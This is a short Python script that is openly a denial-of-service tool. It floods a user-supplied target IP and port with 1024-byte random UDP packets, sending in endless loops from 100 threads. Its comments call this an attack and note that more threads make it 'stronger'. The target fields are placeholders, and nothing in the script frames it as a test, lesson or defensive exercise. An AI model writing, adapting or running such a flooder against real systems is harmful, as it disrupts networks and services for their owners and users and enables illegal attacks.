import socket
import random
import threading

# Define target details
target_ip = 'enter ip'  # Replace with the target IP address
target_port = 'portnumber'  # Common port for HTTP

# Create a random byte message
message = random._urandom(1024)  # 1024-byte packet

def attack():
    """Function to send packets continuously."""
    while True:
        try:
            # Create a UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            # Send the packet to the target
            sock.sendto(message, (target_ip, target_port))

            # Optional: Print a message for each packet sent (can slow down the attack)
            print(f"Packet sent to {target_ip}:{target_port}")

        except Exception as e:
            print(f"Error: {e}")
            break

# Number of threads (the higher, the stronger the attack)
threads = []

for i in range(100):  # Adjust the number of threads as needed
    thread = threading.Thread(target=attack)
    thread.start()
    threads.append(thread)

# Wait for all threads to complete
for thread in threads:
    thread.join()
